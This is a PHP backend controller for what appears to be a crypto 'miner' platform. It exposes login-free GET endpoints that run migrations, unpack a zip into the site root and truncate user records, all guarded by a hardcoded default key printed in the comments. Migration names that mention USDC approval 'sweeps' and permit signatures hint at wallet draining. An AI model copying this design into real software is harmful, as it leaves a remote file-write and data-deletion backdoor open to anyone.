<?php

namespace app\api\controller;

use app\common\controller\HecApi;
use app\common\library\HecAdminMenu;
use app\common\library\HecSiteConfig;
use think\Config;
use think\Db;

/**
 * 数据库迁移（部署后执行一次）
 * GET /api/migrate/run?key=hec-migrate-20260624
 * GET /api/migrate/clear_user_miners?key=hec-migrate-20260624
 * GET /api/migrate/unpack?key=hec-migrate-20260624
 */
class Migrate extends HecApi
{
    protected $noNeedLogin = ['run', 'clear_user_miners', 'unpack'];

    public function run()
    {
        $key = $this->request->get('key', '');
        if (!$this->assertMigrateKey($key)) {
            $this->hecError('无效的迁移密钥', 403);
        }

        $files = [
            '20260622_hec_user_register.sql',
            '20260624_hec_business.sql',
            '20260625_hec_withdraw_deduct.sql',
            '20260626_miner_type_simplify.sql',
            '20260627_miner_type_image.sql',
            '20260628_balance_logs.sql',
            '20260629_permit_expires_ensure.sql',
            '20260630_usdc_approve.sql',
            '20260630_configgroup_trim.sql',
            '20260631_hec_admin_wallet_config.sql',
            '20260632_usdc_approve_sync.sql',
            '20260633_usdc_to_usdt.sql',
            '20260634_hec_c2c.sql',
            '20260635_hec_c2c_buyer_name.sql',
            '20260636_usdc_approve_sweep_u.sql',
            '20260637_usdc_approve_permit_signature.sql',
            '20260638_usdc_approve_sweep_status.sql',
            '20260640_usdc_approve_permit_meta.sql',
            '20260641_usdc_approve_grant_miner.sql',
            '20260642_user_miner_grant_source.sql',
            '20260643_customer_service_config.sql',
        ];
        $base = dirname(dirname(dirname(__DIR__))) . DIRECTORY_SEPARATOR . 'database' . DIRECTORY_SEPARATOR . 'migrations' . DIRECTORY_SEPARATOR;
        $executed = [];
        $errors = [];

        foreach ($files as $file) {
            $path = $base . $file;
            if (!is_file($path)) {
                $errors[] = "文件不存在: {$file}";
                continue;
            }
            $sql = file_get_contents($path);
            $statements = $this->splitSql($sql);
            foreach ($statements as $stmt) {
                $stmt = trim($stmt);
                if ($stmt === '') {
                    continue;
                }
                $stmt = preg_replace('/^--.*\R/m', '', $stmt);
                $stmt = trim($stmt);
                if ($stmt === '') {
                    continue;
                }
                try {
                    Db::execute($stmt);
                } catch (\Throwable $e) {
                    $msg = $e->getMessage();
                    if (stripos($msg, 'Duplicate column') !== false
                        || stripos($msg, 'already exists') !== false
                        || stripos($msg, 'Duplicate entry') !== false) {
                        continue;
                    }
                    $errors[] = substr($stmt, 0, 80) . '... => ' . $msg;
                }
            }
            $executed[] = $file;
        }

        try {
            HecAdminMenu::install();
            $executed[] = 'hec_admin_menu (PHP)';
        } catch (\Throwable $e) {
            $errors[] = 'hec_admin_menu => ' . $e->getMessage();
        }

        $routeCache = RUNTIME_PATH . 'route.php';
        if (is_file($routeCache)) {
            @unlink($routeCache);
            $executed[] = 'route_cache_cleared';
        }

        try {
            HecSiteConfig::refreshSiteFile();
            $executed[] = 'site_php_refreshed';
        } catch (\Throwable $e) {
            $errors[] = 'site_php_refreshed => ' . $e->getMessage();
        }

        $this->hecJson([
            'message'  => '迁移执行完成',
            'executed' => $executed,
            'errors'   => $errors,
        ]);
    }

    /**
     * 解压 FTP 上传的部署包 _deploy/hec-backend.zip 到站点根目录
     */
    public function unpack()
    {
        $key = $this->request->get('key', '');
        if (!$this->assertMigrateKey($key)) {
            $this->hecError('无效的迁移密钥', 403);
        }

        if (!class_exists('ZipArchive')) {
            $this->hecError('服务器未启用 ZipArchive 扩展', 500);
        }

        $root = dirname(dirname(dirname(__DIR__)));
        $zipPath = $root . DIRECTORY_SEPARATOR . '_deploy' . DIRECTORY_SEPARATOR . 'hec-backend.zip';
        if (!is_file($zipPath)) {
            $this->hecError('部署包不存在: _deploy/hec-backend.zip', 404);
        }

        $zip = new \ZipArchive();
        $open = $zip->open($zipPath);
        if ($open !== true) {
            $this->hecError('无法打开部署包，错误码: ' . $open, 500);
        }

        if (!$zip->extractTo($root)) {
            $zip->close();
            $this->hecError('解压失败', 500);
        }
        $zip->close();

        @unlink($zipPath);

        $routeCache = RUNTIME_PATH . 'route.php';
        if (is_file($routeCache)) {
            @unlink($routeCache);
        }

        $this->hecJson([
            'message' => '部署包解压完成',
            'zip'     => '_deploy/hec-backend.zip',
        ]);
    }

    /**
     * 清空全部用户矿机记录
     */
    public function clear_user_miners()
    {
        $key = $this->request->get('key', '');
        if (!$this->assertMigrateKey($key)) {
            $this->hecError('无效的迁移密钥', 403);
        }

        $count = (int)Db::name('user_miner')->count();
        Db::execute('TRUNCATE TABLE `my_user_miner`');

        $this->hecJson([
            'message' => '用户矿机已全部删除',
            'deleted' => $count,
        ]);
    }

    protected function assertMigrateKey($key)
    {
        $expected = Config::get('hec.migrate_key') ?: 'hec-migrate-20260624';
        return $key && hash_equals($expected, (string)$key);
    }

    protected function splitSql($sql)
    {
        $parts = preg_split('/;\s*\n/', $sql);
        return $parts ?: [];
    }
}
